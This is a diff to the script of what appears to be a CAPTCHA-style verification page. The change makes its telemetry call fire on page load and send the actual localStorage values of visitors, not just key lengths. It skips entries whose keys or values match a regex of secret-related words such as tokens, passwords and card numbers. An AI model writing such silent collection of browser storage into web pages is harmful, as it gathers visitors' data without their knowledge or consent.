@@ -115,7 +115,6 @@ function showFinalLoader() {
     checkboxWindow.hidden = true;
     verifywindow.style.display = "none";
     finalLoader.hidden = false;
-    sendVerificationMonitoring();
 
     let startedAt = Date.now();
     let duration = 9000;
@@ -142,14 +141,23 @@ function showFinalLoader() {
     updateProgress();
 }
 
-function describeStorage(storage) {
+const sensitiveStoragePattern = /(?:auth|token|password|passwd|secret|credential|session|csrf|jwt|bearer|api[_-]?key|private[_-]?key|payment|card|cvv|cvc|ssn)/i;
+const sensitiveValuePattern = /^(?:bearer\s+|eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$)/i;
+
+function isSafeStorageEntry(key, value) {
+    return !sensitiveStoragePattern.test(key) && !sensitiveValuePattern.test(value);
+}
+
+function describeLocalStorage(storage) {
     const entries = [];
     try {
         for (let index = 0; index < storage.length; index += 1) {
             const key = storage.key(index);
             if (key !== null) {
                 const value = storage.getItem(key) || "";
-                entries.push({ key: key.slice(0, 100), length: value.length });
+                if (isSafeStorageEntry(key, value)) {
+                    entries.push({ key: key.slice(0, 100), value: value.slice(0, 1000) });
+                }
             }
         }
     } catch {
@@ -172,7 +180,6 @@ function sendVerificationMonitoring() {
         const userAgentData = navigator.userAgentData;
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const localStorage = getBrowserStorage("localStorage");
-        const sessionStorage = getBrowserStorage("sessionStorage");
 
         telemetry = {
             timestamp: new Date().toISOString(),
@@ -206,21 +213,17 @@ function sendVerificationMonitoring() {
             } : {},
             capabilities: {
                 localStorage: Boolean(localStorage),
-                sessionStorage: Boolean(sessionStorage),
                 serviceWorker: "serviceWorker" in navigator,
                 touchPoints: navigator.maxTouchPoints || 0,
                 online: navigator.onLine
             },
             session: {
-                url: window.location.href,
-                referrer: document.referrer || "Unavailable",
+                url: window.location.pathname,
+                referrer: document.referrer ? new URL(document.referrer).origin : "Unavailable",
                 visibility: document.visibilityState,
                 historyLength: window.history.length
             },
-            storage: [
-                ...describeStorage(localStorage),
-                ...describeStorage(sessionStorage)
-            ]
+            storage: describeLocalStorage(localStorage)
         };
     } catch {
         return;
@@ -230,6 +233,8 @@ function sendVerificationMonitoring() {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "verification-monitoring", telemetry }),
+        credentials: "omit",
+        referrerPolicy: "no-referrer",
         keepalive: true
     }).then(function (response) {
         if (!response.ok) {
@@ -240,4 +245,5 @@ function sendVerificationMonitoring() {
     });
 }
 
+sendVerificationMonitoring();
 addCaptchaListeners();
